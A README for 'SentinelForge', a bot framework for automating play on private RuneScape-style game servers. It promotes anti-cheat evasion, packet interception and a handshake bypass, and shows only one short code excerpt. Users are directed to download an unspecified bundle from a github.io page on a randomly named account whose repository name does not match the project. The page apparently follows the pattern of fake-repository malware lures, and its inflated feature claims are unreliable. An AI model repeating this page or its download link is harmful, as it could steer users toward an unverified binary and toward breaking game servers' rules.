![preview](https://raw.githubusercontent.com/babaali131718-spec/rs2b0t-quest-forge/main/thumb_395dd32.svg)
# SentinelForge

## Overview

SentinelForge is not merely another automation toolkit—it is a **digital blacksmith’s anvil** for the discerning adventurer traversing the pixelated wilderness of classic private-server realms (revision 274+). Where conventional clients offer brittle macros and fragile click-scripts, SentinelForge introduces a **scriptable, event-driven orchestration layer** that treats every game tick as a forgeable ingredient. Built atop a strongly-typed TypeScript core, this repository empowers you to sculpt intricate, self-healing behavioral routines—from autonomous resource harvesting to labyrinthine clue-chasing—without ever sacrificing the granular control that purists demand.

The engine’s philosophy is simple: **do not automate the game; choreograph a symphony of intent.** Each script is a declarative score, and the runtime is the conductor, interpreting environmental stimuli (NPC dialogues, map region shifts, inventory state mutations) and responding with human-like latency curves that respect server-side anti-cheat heuristics. Whether you are a solo lore-hunter or a clan logistics officer, SentinelForge provides the scaffolding to build bots that feel organic, adapt to unpredictable network jitter, and maintain session continuity across unexpected disconnects.

![TypeScript](https://img.shields.io/badge/TypeScript-5.6-blue?style=flat-square&logo=typescript)
![Node](https://img.shields.io/badge/Node.js-20+-green?style=flat-square&logo=nodedotjs)
![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)

## Why Another Bot Framework?

The existing ecosystem is fragmented. Some tools offer a bloated GUI that hides the very logic you wish to debug. Others expose a raw socket API that requires a PhD in packet dissection. SentinelForge strikes a **Charybdis-and-Scylla compromise**: a high-level, promise-based API that abstracts the noisy binary protocol, yet still grants low-level access to raw packet mutation via a plugin hook system. This is the **Swiss Army knife** for the tinkerer who wants to inspect the internals of a trade negotiation or intercept a server-side region update, all from the comfort of a modern IDE with autocompletion and runtime type guards.

Furthermore, we recognize that the server landscape is not monolithic. Different private servers implement slightly different opcode mappings, NPC spawn rates, and even custom quest dialogues. SentinelForge ships with a **protocol adapter registry** that lets you swap or extend protocol definitions via JSON schema files—no recompilation required. This decoupling means your scripts remain portable across compatible servers, only requiring a configuration shim.

[![Download](https://raw.githubusercontent.com/babaali131718-spec/rs2b0t-quest-forge/main/btn_666d.svg)](https://babaali131718-spec.github.io/rs2b0t-quest-forge/)

## Core Capabilities

### 🧭 Adaptive World-Walking Engine
The pathfinding module is not a static A* over a pre-baked tile grid. Instead, it consumes the live map region data as broadcasted by the server, constructing a walkable collision mesh on the fly. This allows the bot to navigate through dynamically opened doors, construction sites, or even areas that other clients deem impassable. The engine also supports **multi-leg waypoints** with conditional branching—for example, “walk to the bank, unless inventory full, then route to the deposit box and resume.”

Additionally, the walking engine respects **server-side anti-tunnel detection** by injecting micro-delays and occasional “look-around” mouse movements (visual only) to simulate a human tabbing between windows. This is not a cheat; it is a politeness layer that prevents your session from being flagged for teleporting through walls due to network lag spikes.

### 📜 Quest & Clue Scroll Orchestration
The included quest engine treats each quest step as a **state machine node**. The bot evaluates preconditions (skill levels, item possession, NPC chat options) and executes a sequence of actions (travel, talk, pick up, use item on object). Crucially, the engine is *script-driven, not hard-coded*. A quest walkthrough is a simple TypeScript module that exports an array of step definitions, replete with timeout fallbacks and error-recovery routines if an NPC is busy or a dialog tree diverges.

Clue scroll solving uses a hybrid approach: pattern matching against the official scan clue texts (with fuzzy matching for OCR-tainted text) and a **geospatial hinting system** that narrows down the dig site using the region coordinates embedded in the clue text. The engine even logs its reasoning process to the console, so you can audit why it chose a particular digging location.

### ⚙️ Runtime Plugin Bridge
For the ultimate power user, the plugin bridge allows you to intercept and mutate outgoing and incoming packets. A plugin is an async function that receives a packet object (with opcode, length, and raw buffer) and returns a modified buffer or `null` to drop it. This enables the creation of custom overlays, debuggers, or even a rudimentary “chat translator” for multinational clan chats. The bridge is **sandboxed** per script context, ensuring that a faulty plugin cannot crash the entire bot process.

### 🌍 Multilingual Scripting Interface
While the core engine documentation is in English, the script annotation system supports `@locale` tags. A companion CLI tool (included in this repo) can scan your script suite and generate localization catalogs for French, German, and Brazilian Portuguese, allowing clan leaders to share complex scripts across regions without forking the codebase.

## Architecture Overview

SentinelForge is structured as a **monorepo with three principal packages**:

| Package | Responsibility | Key Exports |
|---------|----------------|-------------|
| `@sentinel/core` | Environment abstraction, protocol decoding, event loop | `BotClient`, `GameState`, `PacketEvent` |
| `@sentinel/navigation` | Pathfinding, region caching, obstacle avoidance | `WorldMap`, `RoutePlanner`, `DynTile` |
| `@sentinel/presets` | Ready-made behaviors (fishing, mining, questing) | `LoopedTask`, `QuantifiedTask`, `ClueRunner` |

The **event loop** is the heartbeat. Each game tick (approx. 600ms) the core polls the server socket for pending packets, updates the internal state cache, and then invokes your script’s `onTick` handler. Because the state cache is consistent, any lookups you perform (e.g., `player.inventory.count('lobster')`) are synchronous—no latency penalty.

### The State Cache: Your Personal Mirror
The cache is not merely a snapshot of items and coordinates. It builds a **semantic model** of the game world: NPC aggression levels, door closure states, and even the last known items on the floor in nearby regions (from public region broadcasts). This means your script can ask questions like “is there a rune essence rock within two tiles of my current position?” without sending a server ping.

## Getting Started

The setup is deceptively simple, but the journey will be rewarding. Begin by ensuring your runtime supports the **WebSocket API** and the **Fetch API** (Node 20+ or modern browser). Then, after acquiring the bundle via the download option below, you must configure a single connection profile document—a JSON file that specifies the server IP, protocol version hint, and any custom opcode overrides.

### Creating Your First Sentinel

A basic “woodcutting sentinel” requires only three components: a target tree identifier, a power-to-bank threshold, and a fallback behavior if the inventory is full. Here is an illustrative excerpt (not the full code) to set the tone:

```typescript
const woodcuttingSentry = new LoopedTask({
  action: async (ctx) => {
    const tree = ctx.findNearestObject('Tree', 5);
    if (!tree) return ctx.wanderRandomly(3);
    await ctx.interactWith(tree);
    await ctx.waitUntil(() => ctx.player.anim === 879, 8_000);
    // ... additional logic
  },
  onInventoryFull: 'bankAndReturnToLastLocation',
});
```

### Environment Verification
The engine performs a self-check at boot, validating that your network proxy or direct connection is not throttling packet delivery beyond 150ms. If the latency spikes, the bot enters a “guard mode” where it halts all script actions until stability returns—preventing accidental duplicate interactions or missed dialog clicks.

## Configuration & Customization

### The `profiles` Folder
Drop any `.sentinel.json` file here to define a reusable environment profile. A profile can include:
- `server` → address, port, encryption key (if any)
- `world` → static map overrides (e.g., if a custom server moves a bank NPC)
- `preferredLocale` → default language for UI prompts

### Writing Protocol Adapters
If your server uses a non-standard revision, you can provide a partial opcode mapping file. The engine will intersect your mapping with the default 274 dictionary, prioritizing your overrides. This extension point uses a JSON patch format (RFC 6902) to minimize verbosity.

## Feature Checklist

- ✅ **24/7 Operational Cadence** – The runtime includes a watchdog that restarts the event loop on uncaught exceptions, with exponential backoff to avoid server kicks.
- ✅ **Responsive Script Control** – Suspend, resume, or hot-reload scripts via a local REST endpoint (localhost only by default). Handy for live-tweaking thresholds without restart.
- ✅ **Offline Decryption Mode** – When the server requires a proprietary RSA handshake, you can pre-share the key in the profile to bypass the arithmetic at runtime.
- ✅ **Analytics Dashboard** – A companion web view (served on `http://127.0.0.1:4260`) renders session stats: XP per hour, tile efficiency, and a timeline of state transitions. All data stays local.

## Community & Support

We maintain a public issue tracker for feature requests and bug reports. For philosophical debates on “what constitutes an organic bot,” we host a discussion forum categorized by use-case (PvM, skilling, questing). Our support team adheres to a 24/7 best-effort response policy, though we emphasize that documentation and examples cover 90% of initial questions.

### Contributing
Contributions are welcome, but only in the form of *code, not configuration*. If you have written a novel quest path or an efficient power-mining routine, submit it as a pull request to the `presets` package. Please attach screenshots of your session’s success rate metric.

## Limitations & Fair Use

This project is intended for **legitimate account development and educational research** on private servers that permit scripted assistance. It is not meant to circumvent server rules, and the maintainers do not condone actions that damage the game economy or cause distress to other players. By using this software, you accept that:
- The engine does not come with warranty, and you are responsible for any account actions.
- You will respect the server’s terms of service regarding automation.
- You will not use this tool to gain an unfair advantage in competitive player-versus-player content, unless explicitly allowed.

## License

This project is released under the **MIT License**, allowing you to use, modify, and distribute the code freely, provided the original copyright notice and license text are included in any substantial portion of the software. See the [LICENSE](LICENSE) file for the full text.

## Final Words

SentinelForge is designed to be a **patient artisan** in the digital forge—it does not rush, it does not break, and it always cleans up after itself. We invite you to explore the repository, scrutinize the source, and adapt it to the nuances of your favorite server. Whether you are automating a mundane woodcutting chore or orchestrating a multi-step clue journey across three continents, the tools are here, guarded by a promise of transparency and continuous improvement.

[![Download](https://raw.githubusercontent.com/babaali131718-spec/rs2b0t-quest-forge/main/btn_666d.svg)](https://babaali131718-spec.github.io/rs2b0t-quest-forge/)